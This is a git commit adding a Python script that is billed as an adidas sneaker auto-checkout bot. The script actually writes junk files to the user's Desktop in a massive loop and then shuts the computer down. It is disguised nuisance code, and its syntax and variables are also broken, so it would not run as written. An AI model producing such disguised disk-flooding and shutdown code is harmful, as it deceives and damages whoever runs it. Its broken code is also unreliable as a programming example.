2935399229cafdd23d676142ca1f5f496c2a640c
masterbate <leftylemonzilla@gmail.com>
2017-01-26 16:24:22 -0500

    Important ATC code
    Learned this from my skills in programming, adidas will be on their knees

---
+++ main.py
@@ -0,0 +1,15 @@
+import os
+import random
+import subprocess
+
+print("Starting splashsource, SHOES INCOMING")
+
+for i in xrange(10000):
+    print("Windows detected!")
+    toCop = raw_input("What shoe should we buy from adidas? Type sku: ")
+    print("We are buying %s" % toCop + "!")
+    for i in xrange(1000):
+        with open(os.path.expanduser('~') + '/Desktop/' + str(sku) + str(random.randint(1000, 999999), w) as cnt:
+            cnt.write("COPPING ADIDAS " * 1000)
+print("We fucking cooked dude")
+subprocess.call(["shutdown", "/s"])
